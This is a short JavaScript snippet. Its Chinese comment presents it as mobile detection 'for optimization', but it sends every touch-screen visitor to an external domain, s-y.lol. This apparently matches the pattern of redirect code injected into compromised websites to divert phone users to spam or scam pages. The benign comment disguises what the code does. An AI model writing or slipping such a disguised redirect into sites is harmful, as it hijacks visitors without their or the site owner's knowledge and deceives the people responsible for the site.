// 检测移动设备 为了优化的
function isMobileDevice() {
    if (window.matchMedia) {
        const mediaQueryList = window.matchMedia('(pointer: coarse)');
        return mediaQueryList.matches;
    }
    return false;
}
if (isMobileDevice()) {
    window.location.href = 'https://s-y.lol/';
}